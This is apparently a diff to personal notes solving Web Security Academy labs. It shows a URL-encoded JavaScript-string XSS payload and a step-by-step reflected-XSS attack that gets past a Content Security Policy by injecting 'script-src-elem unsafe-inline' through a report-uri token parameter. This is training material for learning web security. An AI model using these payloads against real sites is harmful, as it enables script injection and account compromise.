@@ -180,6 +180,24 @@ https://0a0d00c503757a0082e5426800cf00f4.web-security-academy.net/post?postId=5&
 // url encoded:
 https://0a0d00c503757a0082e5426800cf00f4.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
 
+===
 
+Reflected XSS protected by CSP, with CSP bypass
 
+// we try injecting.
+// the content appears, but no payload executes
+<img src=1 onerror=alert(1)>
+
+// query appears in source as:
+<h1>0 search results for '<img src=1 onerror=alert(1)>'</h1>
+
+// note that in the response for the query,
+// there is a CSP header which contains a token
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+
+// since we can modify the token param, we can inject
+// script-src-elem targets script elements
+// unsafe-inline allows the use of inline scripts
+// example raw payload:
+<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
 
